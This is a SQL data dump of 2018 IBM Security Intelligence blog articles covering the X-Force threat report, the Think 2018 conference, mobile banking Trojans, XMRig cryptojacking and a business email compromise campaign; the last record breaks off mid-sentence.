INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, '2018 IBM X-Force Report: Shellshock Fades, Gozi Rises and Insider Threats Soar', 'Michelle Alvarez', '2018-4-4', 'The   team examined numerous cyberthreats that shaped the threat landscape in 2017 and will continue to have an impact in 2018. The   delved into some of the biggest issues the research team uncovered in the past year. Inadvertent insiders — employees who unwittingly caused security incidents through negligent actions — took center stage in 2017. According to the latest X-Force report, they were responsible for more than two-thirds of total records compromised last year.   and networked backup incidents unintentionally exposed more than 2 billion records, making confidential data ripe for picking. \n To uncover key trends in the 2017 cybersecurity threat landscape, such as the threat from  , IBM X-Force research teams combed through and analyzed hundreds of millions of data points. Below are a few important findings from the IBM X-Force Threat Intelligence Index 2018. Read the full   to discover how to keep pace with the changing threat landscape so you can make strategic decisions about cybersecurity and safeguard your business from costly cyberattacks.', '\'Gozi\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Insider Threats\', \'Malware\', \'Shellshock\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'X-Force\'', 'https://securityintelligence.com/2018-ibm-x-force-report-shellshock-fades-gozi-rises-and-insider-threats-soar/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'Know Your Security X’s and O’s: Your Cyberdefense Team Is Only as Good as Its Threat Intelligence', 'Rueben Rodriguez', '2018-4-2', 'All of us in the security industry realize that we face a virtually insurmountable task to ensure that the data belonging to our organizations and customers is kept safe and secure. If you step back and think about it, the list of potential perpetrators is daunting in scope. It includes cybercriminals, hacktivists, foreign governments, and both  . Not only are they persistent, but they also work together like a well-oiled college basketball team determined to cut down the nets — except cybercriminals are working toward the singular goal of gaining illegal access to data. The tools cybercriminals use to achieve this goal vary, but they are all designed to exploit weaknesses, both human and technological, and defeat or disrupt the many layers organizations put in place to protect their critical assets. It’s the ultimate game of cyber cat and mouse in which the opponents deploy cunning techniques to trick innocent bystanders into letting their guard down. Investment in robust, cutting-edge security systems and thorough training are crucial to prevent such activity. Of course, the security teams we have in place to protect our digital information deserve a lot of credit for applying their know-how and skills to use advanced capabilities such as artificial intelligence (AI)-powered   and timely threat intelligence. If you stop and think about it, threat data really is a make-or-break part of the security playbook. Many people either take it for granted or just assume it’s something to toss into the mix and forget about. Few realize how threat intelligence can empower an organization’s security team. The Ponemon Institute’s “ ” supported this premise, noting that the time it takes to identify and contain a data breach has been reduced due to “investments in such enabling security technologies as security analytics, SIEM, enterprisewide encryption and  ” When your security systems have the most current intelligence, your analysts can make educated decisions with detailed information. Like a basketball team seamlessly working together on the court, you and your security team can use threat intelligence to get ahead in the big game of cyberdefense. So what does this mean for your organization? Are you ready cut down the nets, so to speak? To gear up, make sure you’re taking advantage of the   to strengthen your defenses. By collecting and sharing threat intelligence, you can create the best playbook to help your security team research threats,  , and take swift and coordinated action to protect corporate and customer data.', '\'Data Protection\', \'Data Security\', \'Information Sharing\', \'Security Professionals\', \'Threat Detection\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'Threat Sharing\'', 'https://securityintelligence.com/know-your-security-xs-and-os-your-cyberdefense-team-is-only-as-good-as-its-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'LIVE From IBM Think 2018: Security and Resiliency Campus', 'Stephanie Stack', '2018-3-18', 'Thanks for following along this week as IBM Security & Resiliency took Las Vegas by storm. It wasn’t all work and no fun —   featured three great concerts: Barenaked Ladies, Train and The Chainsmokers. Some of our staff also won big (about $6) at the  , which is an IBM Security tradition when we are in Vegas. I’ll miss those little ponies next year when we roll into San Francisco for Think 2019.   , IBM Executive Security Advisor, shows some of tricks that hackers use to steal our personal information. Watch the replay (skip ahead in the video to the 6:45 timestamp) to learn from real life examples – because to fight the hackers, you have to think like one!   In our business, we often refer to the moment of a cyberattack as the “boom” moment. It’s when you realize something is wrong, and your day just took a turn in a very unexpected direction. We brought this experience to life this week in our Campus Disruption Dome. Imagine you are a Security Director at a hospital who discovers your patient records are on the dark web…or perhaps you’re the CISO who has just been informed that confidential customer client data is in the hands of your competitors…or maybe you’re the CIO of an airline who discovers malware has infected your terminals and passengers are stranded. What do you do next? Watch the   to hear more about how to handle that moment of “boom”.   Our last day in the Campus started with a session from  . He explained that as the security operations center (SOC) model matures, staffing is evolving to focus more on planning and building and less on basic operations. Having the right staffing model and tooling is essential to automate some of the work in the SOC to improve efficiency. For example, automation can help the level 1 analyst reduce error rates and augment decision making on how to handle alerts. Dwyer indicated that many of these automation services will reside in the cloud. Mature SOCs have the capabilities to move beyond traditional threat management to become the point of coordination for managing a range of business risks. Organizations can use the tools and talents of a SOC to extend to cyber fraud, insider threats and other areas to evolve into a  .   \nOne of the new experiences in the IBM X-Force Cyber Range is  , which tests technical aptitude and crisis management. Participants are tasked to execute network-level attacks, cryptography and steganography challenges, network forensics and reverse engineering. With some help from the developers of this experience, Richard Moore, John Clarke and Anthony Johnson (from X-Force Threat Intelligence), I was able find a vulnerable machine, launch an attack and cause havoc ranging from installing malware to data theft and corporate espionage — in less than two minutes!   \nApplication developers adopt DevOps processes to shorten time to market. However, many apps that are released to production contain security defects. Anatoly Bodner and   explained that 25 percent of security defects still make it to the production releases, mostly due to a lack of skills to implement and remediate security controls properly. It’s estimated that over 40 percent of attacks that resulted in data breaches targeted applications last year. Given that it’s 100 times cheaper to fix security defects before an app is released, they suggested that shifting security to the left will have significant benefits. This cultural and process shift is referred to  , which prescribes that each role in the development process must have the skills and tooling they need to fulfill their role. It also builds accountability into the development process, so decisions are not driven by convenience but by outcomes.   An estimated 80 percent of cyberattacks are driven by collaborative cybercriminal groups. In light of this staggering statistic, collaboration among the good guys is required at the threat intelligence and capability level, according to   and Rich Tellijohann in their talk today on  . Paul described the   as the “Google for security,” allowing users to search for keywords and interact with more than 400,000 members and 800+ terabytes of threat intelligence. One retail organization replaced multiple tools, reduced investigation time and streamlined collaboration across the security team by adopting this threat research platform. Rich talked about technology collaboration and the  , where users can share and download more than 140 apps based on IBM Security technologies. He featured a   that integrates threat information in bulk into IBM QRadar. Paul Lindsey from Cigna Information Protection, Global Threat Management also talked about how he maintains a threat sharing network that includes a trusted series of partners and values relationships that are reciprocal in nature. His team also works to create seamless experiences for their security analysts by taking advantage of the apps that help their environment work better together.   As companies invest in business transformation, ensuring that customers, employees and business partners have a frictionless user experience is central. But how can a business know who you are, especially when there are so many ways to prove identity?  While we may tolerate this in the physical world, it’s not acceptable in the digital world where switching costs are low, since they add friction and subtract from the digital experience.  is an ongoing process, not a one-time event, according to  . The more you learn — and the more information that can be corroborated — the more trust you establish. But you must do it in a way that does not impact the user experience. An ideal strategy is to pick one project to start with and make sure that you are taking a multilayered approach to risk assessment. Relying on just a single context domain, such as a device ID or even  , is not enough to provide a high level of trust. You must go beyond that and capture the full view of the user.   A sea change is occurring in how companies view compliance from “because I said to” to an essential requirement that is pervasive across operations, according to  , chief technology officer (CTO) of data security and privacy at IBM Security. Consumers vote with their feet, and she noted that 25 percent of people say they will change providers after a heath care breach. If they don’t trust you, they won’t work for you, buy from you or partner with you. Compliance is a starting position but must evolve to   that is aligned to the business. Organizations must move from “check-the-box” compliance to taking accountability for results and being stewards for data security, as discussed yesterday by   A new IBM study from the Institute of Business Value reported that 50 percent of executives believe that GDPR is an opportunity to transform security, privacy and data management. Cindy advised attendees to prepare to integrate with cloud, practice worst-case scenarios and think about how to embed trust into the fabric of your business.   Recent attacks such as   have exposed risks at the endpoint level,   at the operating system and application level, and   at the hardware level. Operating system patch hygiene is table stakes, but it’s not a strategy, according to  , IBM Security offering manager. He explained the five key elements to an endpoint security strategy: By building an integrated endpoint management strategy, Tom shared how   reduced patching time by 80 percent and saved $500 million in unused software licenses.   Mary O’Brien, IBM Vice President of Development, opened this session by sharing an anecdote in which a CISO recently told her that they started a two-year “lift and shift” project to move from 0 to 95 percent of their workloads to the cloud. Security is a concern but not a barrier, since the benefits of the cloud to modernize their business is so great. Sridhar Muppidi, chief technology officer (CTO) of IBM Security, explained that the journey to cloud can typically be categorized into three scenarios: Regardless of the path of the journey, the presenters explained that your security posture will change. Security teams need to integrate their workloads with the cloud provider’s logs to maintain visibility and meet compliance requirements. However, in all scenarios, security and compliance remains a shared responsibility between the organization and the cloud provider. David Cass, IBM Vice President of cloud and software-as-a-service (SaaS), reminded the audience that you can’t outsource accountability.   As organizations see an explosion of data — including moving to the cloud — security teams are feeling pressure from line of business, audit and security teams.   because it’s dynamic, distributed and in demand. Security controls should be applied to secure information where it resides.  from Gartner Research explained that protecting your data is essential for success in the digital world. When designing data security governance programs, he recommended starting with a proactive approach that includes line-of-business needs (80 percent of IT professionals don’t do this today) rather than starting with point products for specific projects.   The day wrapped with remarks from   on how to achieve   in a world of security attacks. The session concluded with a reception, complete with Margareta Verde refreshments designed personally by Bruce.   A panel of transformational speakers challenged everyone to stand up and be the voice of change to open doors for equity and keep them open to enable the best talent to thrive. A thoughtful discussion continued about how to break the mold and rethink what is possible — because to develop ethical and unbiased technology, everyone must participate in its creation. This is especially important in cybersecurity, which is an area with a significant shortage of skills, although   about growing the presence of women.   The IBM Cyber Range team engaged the audience in a short “real-life” scenario that challenged members to respond to allegations that their company’s data has been found on the Dark Web. Three teams — security/IT, communications/PR and HR/legal — had to determine their next three moves after receiving a phone call from a reporter. Participants had to think on their feet and chaos ensued. Over 1,400 organizations visited the   in 2017 to test their level of readiness.   explained that the first step an analyst needs to take in this situation is to validate and verify the data, often by identifying the compromised credentials and looking for patterns of unusual behavior. Next, the response team must be quickly assembled, and most participants fail miserably in this step because they cannot identify and contact the right people. Finally, a “break-the-glass” crisis response plan needs to be activated. Guidance from Executive Director Christopher Crummey is to “practice like you fight, and fight like you practice.”   explained how the learning activities are designed around   to deliver a hands-on and fun experience.   Some of our X-Force Red superstars showed me demos of their latest services offerings on display in the campus. I started out in the   experience with   and  . I created a long password with letters, numbers and symbols and felt confident it was secure. Well, it only took them 148 seconds to analyze and break it! Their password cracking system is used with organizations as part of comprehensive reviews of cybersecurity readiness. Coincidentally, Cracken was featured on the   this morning.  and his team members   and   also showed me the  , a subscription-based service that streamlines testing programs for organizations. Through an easy-to-use web portal, testing workflow, history and budgets can be easily maintained and retrieved when necessary. The X-Force Red team has the capability to test virtually any type of target and technology and has global coverage.   According to the recent “ ,” security is beginning to outweigh convenience for many people — however, there are generational differences. Younger people are moving beyond passwords but adopting biometrics at a faster rate than other demographic groups. The message to developers is to design for a frictionless user experience so that  , you don’t even know it’s there.   The   opened with a   that described a “boom” moment — said less politely, it’s when the “sh*t hits the fan.” It’s the time when you experience a cyber incident — maybe it’s ransomware, stolen credentials or even a failed audit. Left of boom, where most security professionals are comfortable, is the space of prevention and detection.   is a decidedly less comfortable space: Every second matters and you often need to engage outside of the IT and security team — often legal, human resources, public relations and even the board of directors. In fact, a recent   revealed that more than 75 percent of organizations do not have a response plan in place. ,   and Mike Errity described how to build a plan that includes the right workflow to orchestrate your way through the boom and the type of partnerships that can help you in your time of need. These partnerships include a technical response team that can quickly analyze the situation,   and work with law enforcement. Also required are experts that can quickly recover of all of the technology and assets to restore business operations. \n   Live from “The Cube” at Think,   described how we’ve reached the perfect storm in cybersecurity. With more than 1.2 million unfilled jobs predicted, coupled with 50 billion connected Internet of Things (IoT) devices, the opportunity for criminals to attack is increasing and the number of professionals to stop them is not. We are entering the era of man assisted by machine, and infusing AI and machine learning into security is   to fight cybercrime.   This session opened with a simple question: “What if you were a doctor that had to perform life-or-death surgery blindfolded on dozens of patients while a superbug took over the operating room?” Everyone agrees we would never allow our health to be jeopardized in such a manner. However, that nightmare scenario is starting to occur in security operations centers (SOCs). As web traffic encryption becomes more pervasive, workloads move to the cloud and the number of Internet of Things (IoT) devices to secure explodes, it’s getting more and more difficult for overworked security analysts to see what’s really happening in the environments that they’re tasked with protecting. IBM Security Vice Presidents Jim Brennan and Koos Lodewijkx described a vision for the SOC of tomorrow that they call SecOps.Next. This platform will be capable of dealing not only with these challenges, but also with those that we have not yet even considered.   about how you can see across all devices and clouds, tear down internal silos between IT and security, automate to get your team focused on what matters most, and ensure all are rowing in the same direction to get ahead of threats.   IBM Chairman, President and CEO Ginni Rometty opened the conference by declaring that this is an exponential moment when business and technology align to give you the ability to outlearn everyone else in your industry. Rometty remarked that the exponential growth of data provides one of the greatest opportunities and has the potential to be the greatest issue of our time. She challenged us all to think about the  , how our professions will evolve (such as  ) and making inclusion (especially for  ) a reality for everyone.   The campus format is all new this year, designed to make it easier for everyone to network, learn and recharge. The Security & Resiliency Campus has been described as “an amusement park for cyber geeks,” and tonight’s opening reception did not disappoint. After introductory remarks, more than 20 demo stations came to life, all staffed by experts in light blue shirts ready to assist visitors. During the week, our campus is the place for most of the security curriculum. Our agenda is organized into 12 topic areas, and each includes a 40-minute Core Curriculum session (which will be available for viewing  ) and a related series of 20-minute Think Tank discussions. For a summary of the 12 topic areas,  you’ll find the   a helpful companion to the Think Mobile App. With over 160 sessions, hands-on labs and interactive experiences to choose from, there is something for everyone.   In today’s keynote for IBM Security Business Partners, IBM Security General Manager Marc van Zadelhoff reminisced that it’s been just 6 short years since the IBM Security business unit was established. And with the help of our channel partners, we are just getting started in taking the $90B market for security solutions by storm. IBM Security Strategy Vice President   explained the three-point plan for growth:   More than 70 percent of organizations believe that digital transformation is essential to their business though it comes with increased risk of data breaches and cyberattacks, according to a new study from the Ponemon Institute. Larry Ponemon presented findings from the new study “ .” Securing cloud environments, data critical to operations, IoT devices and high value assets were noted as being critical elements of a successful digital transformation.   Do you have the skills to join the hacking team “Daemon Crew”? The   team is challenging you to test your skills to see if you are “leet” enough to join their operation.   , IBM Security Threat Gamification Engineer, will lead you through a timed challenge – since in order to fight the hackers, you need to think like a hacker! You can also take a virtual reality tour of the X-Force Command Center.  Stop by the experience in Think Academy (Mandalay Bay South, Level 2, Shoreline).   I managed to get a sneak peek at some of the fun items available for visitors to Security & Resiliency Campus. If your work bag is a disorganized mess of cords, stop by and pick up a roll-and-go cord keeper. My personal favorite is the pop socket – especially since my number of cracked phone screen claims has exceeded my insurance coverage. We kick things off tonight in the Campus with a party at 5:30 p.m. — with refreshments, live music and experts on hand to answer your security questions.   Most organizations can’t scale to handle the level of threats coming into today’s security operations centers (SOCs), according to IBM Offering Manager  . He explained that security analysts are only able to keep up with 8 percent of the information they need to do their jobs, and 43 percent of security professionals ignore a significant number of alerts.  uses artificial intelligence (AI) to unlock a new partnership between security analysts and their systems and technology. Through a series of examples and an interactive discussion with the audience, Hankins illustrated how Watson helps Tier 1, 2 and 3 analysts work with more speed and efficiency.   , IBM chief technology officer (CTO) for data security and privacy, drew huge crowds this morning for her talk on the General Data Protection Regulation (GDPR). She shared a practical road map based on client experiences to help attendees assess which controls to implement and how to measure progress. She also explained the five steps in the IBM Framework for GDPR: assess, design, transform, operate and conform. If you missed her talk, you can find Cindy’s blogs and webinars in our ongoing series, “ .”   The team from the IBM Security Learning Academy is broadcasting live all week with a packed schedule of Open Mic, Tech Talk and Ask the Expert sessions. Check out the   and, if you’d like,   in advance. The team’s lab is open daily in Think Academy — Mandalay Bay South, Level 2 (Shoreline). In addition, you can access more than 1,500 courses and 150 hand-on labs online at  . Stay informed of all of the Security Learning Academy’s programs by following   on Twitter.   Need to shake off the jet lag or recover from a late night fighting cybercrime? This year’s Think Wellness Program offers morning and evening activities that include walking, running, yoga and kickboxing. Expert talks are scheduled throughout the week about nutrition, lifestyle and health. Find out more information in the mobile app, available for   and  .   Today, our clients and partners gathered to swap stories about the daily adventures of working in cybersecurity. In his keynote address, IBM Security General Manager Marc van Zadelhoff announced a new   for clients to network, build relationships, share product feedback and engage with subject matter experts. He noted that we live in a world where cyberattacks happen at the endpoint, application and hardware layers. Solving this problem requires the “good guys” to continue to work together by sharing capabilities, sharing threat intelligence and sharing ideas. The agenda also included user group meetings, which were facilitated by members and IBM product experts. It was like a big family reunion! If you would like to learn more about the IBM Security Community, stop by the Security & Resiliency Campus this week or  .   The Mandalay Bay is coming alive this morning as Thinkers arrive from all over the world. This week, you can follow IBM Security & Resiliency through: If you are with us in Las Vegas, I recommend the IBM Events mobile app to organize your schedule (download in the App Store for   and  ). When you need to charge your electronics (and yourself), we have power stations and snacks in the Security & Resiliency Campus. Let us know what inspires you to think by tagging @IBMSecurity in your social posts.', '\'Security Conferences\', \'Think 2018 Conference\'', 'https://securityintelligence.com/live-from-ibm-think-2018-security-resiliency-campus/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Mobile Banking Trojans as Keen on Cryptocurrency as PC Malware', 'Limor Kessem', '2018-3-5', 'Recent research from IBM X-Force highlighted banking Trojan operators’ increasing interest in stealing cryptocurrency and analyzed a   the TrickBot Trojan used to deliver stolen coins to attackers’ wallets. This trend by no means skipped the mobile malware realm. Mobile malware dedicated to stealing cryptocurrency usually leverages malicious miners that infect devices to collect coins through a   or via  . But if profitability is the main goal, mining on a mobile device may not be the   for attackers. Mobile devices have limited processing power to lend to mining coins, which translates to low returns. In addition, these devices are not connected to a continuous source of electricity, meaning that users are likely to suspect an issue when a device slows down or overheats, potentially resulting in permanent physical damage. Crooks operating mobile banking Trojans don’t install miners on the device. Rather, they typically steal existing coins from unsuspecting owners using mobile malware that creates the same effect as webinjections: Cybercriminals trick users with fake on-screen information, steal their access credentials and take over accounts to empty coins into their own wallets. \n Much like the case of the TrickBot Trojan, which relies on its existing capabilities to use serverside webinjections in attacks against cryptocurrency holders, mobile malware leverages the overlay screen to do the same. Cybercriminals operating mobile malware such as  , BankBot, Marcher and Mazar rely on the malware’s ability to determine which application was opened or is frontmost on the user’s device. They match it with a list of the apps that interest them, and then launch a hardcoded or dynamically fetched overlay to hide the original app screen behind a fake one. By hiding the true app, the user can be lured into tapping his or her access credentials into the fake screen, unknowingly sending them to a remote attacker. The attacker can then attempt to access the victim’s account from another device. When prompted for a second-factor authorization, such as a code sent via SMS, the malware can hijack it directly from the compromised device without the victim ever seeing the message come in. In some cases, the malware operator can even take over the device and remotely control it. This method applies to bank accounts, but malware operators have adapted it to steal cryptocoins. Malware such as   and   incorporates exchange platform Android application package (APK) names designed to trigger an overlay screen as soon as an infected user opens a relevant wallet app. According to X-Force research, attackers target applications that facilitate coin exchanges, including applications for bitcoin, Bitcoin Cash, Ethereum, Litecoin, Monero and other digital assets. The malware’s overlay screens look basic yet convincing, and can lead users to unknowingly send their access credentials to an attacker. \n \n The   is going strong around the world, with new coins emerging and values rising. The common denominator is the measure of anonymity these digital currencies lend to transactions, their unrestricted access from anywhere on the globe and the fact that they can be exchanged for money without being otherwise regulated by any central entity. These features attract legitimate users, but they have been particularly valuable to cybercriminals. Although   and exchange platforms have been on the rise since 2017, X-Force expects to see an escalation in attack diversity and scale in 2018, especially when it comes to malware being used to infect users with miners and stealers designed to target cryptocoins. The mobile malware arena already strives to emulate the success of PC banking Trojans and facilitate cross-channel fraud and identity theft. Cryptocurrency is just another target for malware operators looking to get in on the action. Given the rapid evolution of this threat, organizations should invest in   tools to minimize the risk posed by mobile banking Trojans.', '\'Banking Trojan\', \'Bitcoin\', \'Cryptocurrency\', \'Malware\', \'Mobile Malware\', \'Mobile Security\', \'Mobile Threats\', \'Trojan\'', 'https://securityintelligence.com/mobile-banking-trojans-as-keen-on-cryptocurrency-as-pc-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'Why You Need Collaborative Defense in Depth', 'Salina Wuttke', '2018-3-1', 'We are living in a new security reality. Cybercriminals are increasing both their collaborative efforts and the sophistication of their attacks. Meanwhile, those who defend against them remain siloed and under-resourced. Currently,   of cyberattacks are driven by highly funded, collaborative cybercriminal groups who are sharing knowledge about targets and vulnerabilities. What’s more, sophisticated threats from these collaborative groups are rising in numbers and scale, expanding to more than   in 2016. That’s more than the combined total from the two previous years. But how well are white-hat organizations collaborating to keep pace so that they can protect, detect and respond to these growing attacks? Some enterprises have as many as  . Many of these disparate point products aren’t integrating, communicating or providing security teams with the visibility they need for seamless, holistic protection. At the same time, the volume of data is growing exponentially, adding complexity and risk to an already fragmented infrastructure. Siloed security controls are generating more alerts than organizations can feasibly respond to with their limited time and resources. According to Cisco’s “ ,” 44 percent of security alerts go uninvestigated, increasing the likelihood that a   will go undetected for months. Although the IT   is contributing to successful cyberattacks, a lack of collaboration throughout the organization is another culprit. The events of   showed a dangerous disconnect between security teams, which detect threats, and IT operations teams, which implement controls to prevent threats — not to mention the growing problem of  . After all, security teams can’t protect what they don’t know about. These organizational silos don’t stop there. Consider the lack of collaboration between the C-suite, board of directors, human resources, marketing and finance. All of these groups should be actively participating in their organization’s security efforts, but many enterprises lack a cohesive, cross-functional security strategy. While organizations may have documented security controls and processes in place, the breakdown lies in not sharing or integrating those processes between teams. Processes often stand alone with no visibility or continuity outside of individual departments. In the examples of WannaCry and Petya, there wasn’t a fully integrated process between monitoring malware alerts and delivering patch updates.  that are not effectively managed and communicated across the organization can increase the risk of a security breach. One team might only be able to see part of a system, fail to realize the dependency or risk to another system, and inadvertently weaken security by making an unapproved change. Even if there are tight, collaborative processes detecting threats on the front end,   still lack a consistent incident response plan. How can organizations better collaborate between people, processes and technology for more effective threat defense? Many companies practice   strategies, which focus on deploying a multilayered defense system centered on IT infrastructure, physical assets and personnel training to protect vital data assets. While this approach is still considered one of the best defense models out there, cybercriminals are now able to circumvent many traditional defenses by launching stealthier, sophisticated attacks that are difficult to detect and stop. It’s time we modernized defense in depth to combat cybercrime with the power of collaboration. Collaborative defense in depth solves disparate security challenges within an organization’s people, processes and technologies. It encourages a more converged approach by integrating and streamlining threat defense. This strategy starts with technology at its core. By embracing the practice of building strong, open integrations — both within a security vendor’s portfolio and between solutions from multiple vendors — organizations can accelerate threat defense and extend security capabilities beyond what each technology could provide on its own. Learn more about how IBM Security is supporting collaborative defense in depth at  . There you can hear the latest about the   and how IBM security experts are working with other threat intelligence platforms to improve threat defense. Learn about open APIs in products such as   and  , which are spurring the development of new plug-and-play integrations with IBM business partners. You can also look at the latest apps on the   to streamline and strengthen your security posture while maximizing technology investments. More than 20 partners will be at the Think Security and Resiliency Campus to showcase these collaborative solutions and integrations. Of course, collaborative defense doesn’t stop at technology — it’s the people and processes that drive those technologies. We know cybercriminals are collaborating, so we should be too.', '\'Collaboration\', \'Defense in Depth\', \'Information Sharing\', \'Think 2018 Conference\', \'Threat Intelligence\'', 'https://securityintelligence.com/why-you-need-collaborative-defense-in-depth/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'XMRig: Father Zeus of Cryptocurrency Mining Malware?', 'Limor Kessem', '2018-2-26', 'Cryptocurrency is exploding all over the world, and so are attacks involving cryptocoins. From bitcoin to Ethereum and Monero, cybercriminals are stealing coins via phishing, malware and exchange platform compromises, causing tremendous losses to both consumers and businesses in the sector. High-profile data breaches and theft are responsible for the majority of losses to organizations in the cryptocurrency sector, but there is another, more insidious threat that drains cryptocurrency at a slow and steady rate: malicious crypto-mining, also known as cryptojacking. This scheme exploits end users’ CPU/GPU processing power through compromised websites, devices and servers. This type of malware is wielded by operators aiming to make money on the backs of their victims. Aside from the obvious performance degradation victims will experience, mining can cause machines to consume   and overheat to the point of damage, causing unexpected data loss that may be hard to recover. In one case in Russia, this overheating  . Among the many codes that already plague users and organizations with illicit crypto-mining, it appears that a precursor has emerged: a code base known as XMRig that spawns new offspring without having intended to. The malware world can spawn millions of different strains a year that infect users with codes that are the same or very similar. Code reuse often happens because malware developers won’t reinvent the wheel if they don’t have to. In the banking Trojan world, the most infamous example is the Zeus v2 source code, which was   and has since been used countless times, either as-is or in variations adapted to different targets or geographies. Some examples of Zeus codes are  , but the same DNA also lives in   and  . Parts of it, particularly the injection mechanism, are featured in many other banking Trojans. A similar code leak scenario and subsequent reuse happened in the mobile space with the leak of the   in 2016. That source code   of many other mobile Trojans, including Bankosy, Mazar and SlemBunk, to name a few. The mobile malware arena saw a second precursor emerge when another source code,  , was also leaked in early 2017, giving rise to additional foes. Looking at the cryptojacking arena, which started showing increased activity in mid-2017, it’s easy to notice that the one name that keeps repeating itself is XMRig. Although not inherently malicious, this code’s unrestricted availability makes it popular among malicious actors who adapt it for the illicit mining of Monero cryptocurrency. , which means “coin” in Esperanto, is a decentralized cryptocurrency that grew from a fork in the ByteCoin blockchain. The project itself is open source and crowdfunded. Unlike earlier cryptocoins, Monero, which started in 2014, boasts easier mining and untraceable transactions and has seen its value  . The proof of work algorithm,  , favors computer or server CPUs, in contrast to bitcoin miners, which require relatively more expensive GPU hardware for  . These features attract new, legitimate miners, but they are just as attractive to cybercriminals looking to make money without having to invest much of their own resources. They resort to using malware or simply reworking XMRig to mine Monero. The Monero Project does not endorse any particular tool, software or hardware for miners. While there are at least three other codes available, the popular choice among cybercriminals appears to be the open source XMRig code. According to   on the malicious use of XMRig, black-hat developers have hardly applied any changes to the original code. Past modifications show some changes to hardcoded command-line arguments that contain the attacker’s wallet address and mining pool URL, plus changes to a few arguments that kill all previously running instances of XMRig to ensure no one else benefits from the same hardware. Changes of this scope could take mere minutes to perform. Since it is an open source project, XMRig usually sends a donation of 5 percent of the revenue gained from mined coins to the code author’s wallet address. Malicious iterations of XMRig remove that snippet and the attackers collect 100 percent of the spoils. Some examples of malware names that were spawned from the XMRig code and showed up in recent attacks are   and  . In terms of the attack scale of miners based on XMrig, the numbers are surprising. In January 2018,   250 unique Windows-based executables used on one XMRig-based campaign alone. The overall infection operation was padded with its own download zone from a cloud storage platform, used XMRig proxy services to hide the destination mining pool and even connected the campaign with a cloud-hosted cryptocurrency mining marketplace that connects sellers of hashing power with buyers to maximize profits for the attacker. Cryptojacking can happen on various types of devices, and millions of users have been infected in recent attacks. With malware, the goal is to successfully infect as many endpoints as possible, and X-Force assessment of recent attacks shows that threat actors will attempt to target anything that can lend them free computing power. Aside from the more common endpoint or server, cryptojacking has also been observed on: Although it may seem like any device will do, the most attractive miners are servers, which have more power than the aforementioned devices, 24/7 uptime and connectivity to a reliable power source. Server CPU/GPUs are a fit for Monero mining, which means that XMRig-based malware could enslave them to continuously mine for coins.  exist because many organizations still run outdated systems and assets that are past their end of life, resulting in easy-to-find exploits that compromise and infect them. Worse yet, our researchers believe that older servers that have not been patched for a while are also unlikely to be patched in the future, leaving them susceptible to repeated exploitation and infection. These attacks are reaching organizations in the wild, and a   from IBM X-Force noted that network attacks featuring cryptocurrency CPU miners have grown sixfold. The industrial sector is known to run outdated operating systems and software, leaving it particularly vulnerable. Many times, the internal and operational networks in critical infrastructure can open them up to the increased risk. While data loss would be an issue to any organization, it can potentially result in life-threatening situations at an industrial plant. The world of cryptojacking malware is undergoing rapid evolution, and although permutations of XMRig will likely continue to occur, there is also a threat that   will appear this year. Mitigating the risk from known threats should be an integral part of your cyber hygiene and security management practices. While malware hunting is often regarded as a whack-a-mole endeavor, preventing XMRig-based malcode is easier because of its prevalence in the wild. Since XMRig is open source and keeps getting reused in attacks, security teams should look into controls that deliver blanket protection and eliminate different iterations of this code. For those running older servers and operating systems in which risk of infection is higher, security best practices call for  , implementing compensating controls and planning for a prompt upgrade to dampen risks.', '\'Cryptocurrency\', \'Cryptocurrency Miner\', \'IBM X-Force Research\', \'Malware\', \'Monero\', \'X-Force\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/xmrig-father-zeus-of-cryptocurrency-mining-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'IBM X-Force IRIS Uncovers Active Business Email Compromise Campaign Targeting Fortune 500 Companies', 'Alexandrea Berninger', '2018-2-21', 'IBM X-Force Incident Response and Intelligence Services (IRIS) assesses that threat groups of likely Nigerian origin are engaged in a widespread credential harvesting, phishing and social engineering campaign designed to steal financial assets. Beginning in the fall of 2017, X-Force IRIS experienced a significant increase in clients reporting instances of fraud or attempted fraud via wire transfer payments. These threat groups successfully used business email compromise (BEC) scams to convince accounts payable personnel at some Fortune 500 companies to initiate fraudulent wire transfers into attacker-controlled accounts, resulting in the theft of millions of dollars. This X-Force IRIS report identifies and analyzes two examples of those BEC scams. Although BEC scams are not new, the examples described here detail how attackers used stolen email credentials and sophisticated social engineering tactics without compromising the corporate network to defraud a company. The objective of this report is to inform customers of the BEC threat by exposing the specific tactics used to deceive victims and offer recommendations that companies can immediately implement to help reduce the risk of falling prey to BEC scams. \n Business email compromise scams involve taking over or impersonating a trusted user’s email account to target companies that conduct international wire transfers with the goal of diverting payments to an attacker-controlled account. These attacks are almost entirely based on phishing and social engineering, and are thus attractive to cybercriminals due to their relative simplicity. In most cases, BEC scams involve little to no technical knowledge, malware or special tools. A recent report by   predicted that BEC attacks will comprise over $9 billion in losses in 2018, up from   at the end of 2016. According to the  , BEC scams have been reported in every U.S. state and across 131 nations, and have resulted in  .  researchers observed the attackers involved in BEC scams using well-crafted social engineering tactics that leverage phishing emails to obtain legitimate credentials and ultimately steal large amounts of money. The following tactics were common to the attacks examined by X-Force IRIS researchers: X-Force IRIS assesses that the threat groups that conduct these attacks are likely operating out of Nigeria because both the spoofed sender email addresses and IP addresses used to log in to email web access portals are primarily traced to Nigeria. However, it is worth noting that the same threat actors often leveraged compromised servers or revolving proxies that may be traced to other countries to mask their actual location. Although the size of each individual group is unknown, the threat actors appear to have used a phishing kit to create spoofed DocuSign login pages on over 100 compromised websites. This indicates that the groups comprise more than one person each and are actively engaged in widespread   to harvest business user credentials. The compromised websites vary in geographic location, IP address resolution and industry, and did not appear to have any relation to one another. X-Force IRIS researchers have identified targeted companies in at least the retail, healthcare, financial and professional 